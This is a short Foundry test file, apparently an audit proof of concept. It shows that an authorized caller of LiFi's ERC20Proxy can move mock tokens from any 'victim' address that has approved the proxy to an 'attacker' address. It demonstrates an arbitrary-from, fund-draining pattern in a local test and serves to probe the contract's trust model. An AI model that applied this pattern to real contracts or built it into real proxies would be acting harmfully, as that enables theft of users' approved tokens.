// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import { ERC20Proxy } from "lifi/Periphery/ERC20Proxy.sol";
import { MockERC20 } from "solmate/test/utils/mocks/MockERC20.sol";

contract ERC20ProxyArbitraryFromTest is Test {
    ERC20Proxy proxy;
    MockERC20 token;
    address victim = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        proxy = new ERC20Proxy(address(this));
        proxy.setAuthorizedCaller(address(this), true);
        token = new MockERC20("Mock", "MCK", 18);
        token.mint(victim, 100 ether);
        vm.prank(victim);
        token.approve(address(proxy), type(uint256).max);
    }

    function testAuthorizedCallerCanTransferFromAnyAddress() public {
        proxy.transferFrom(address(token), victim, attacker, 10 ether);
        assertEq(token.balanceOf(attacker), 10 ether);
    }
}

